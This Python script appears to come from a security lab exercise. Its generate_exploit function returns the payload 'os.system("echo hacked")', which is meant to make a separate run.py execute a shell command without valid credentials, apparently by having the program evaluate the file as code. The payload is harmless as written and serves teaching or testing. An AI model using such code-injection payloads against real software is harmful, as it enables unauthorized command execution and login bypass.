def generate_example():
    # WARNING: DON'T EDIT THIS FUNCTION!
    return repr({'username': 'dan', 'password': '1234', 'command': 'echo cool'})


def generate_exploit() -> str:
    """This function returns the payload that will print `hacked`.

    Our payload should cause `run.py` to print out `hacked` even without
    us using a valid username/password combination.

    Warnings:
    1. You must NOT use a valid username/password combination
    2. `run.py` should print `hacked`, and the testing will be case *sensitive*

    Returns:
         The string of the payload.
    """
    return 'os.system("echo hacked")'


def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    if not 2 <= len(argv) <= 3:
        print('USAGE: %s [--example] <script-path>' % argv[0])
        return 1
    if len(argv) == 2:
        example, path = False, argv[1]
    else:
        example, path = True,  argv[2]
    if example:
        script = generate_example()
    else:
        script = generate_exploit()
    with open(path, 'w') as writer:
        writer.write(script)
    print('done')


if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))
